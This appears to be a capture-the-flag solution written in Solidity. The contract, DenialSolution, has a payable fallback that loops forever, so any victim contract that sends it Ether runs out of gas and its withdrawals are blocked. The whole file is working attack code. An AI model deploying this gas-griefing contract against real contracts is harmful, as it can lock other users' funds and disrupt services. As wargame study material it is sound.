// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract DenialSolution {
    fallback() external payable {
        while (true) {}
    }
}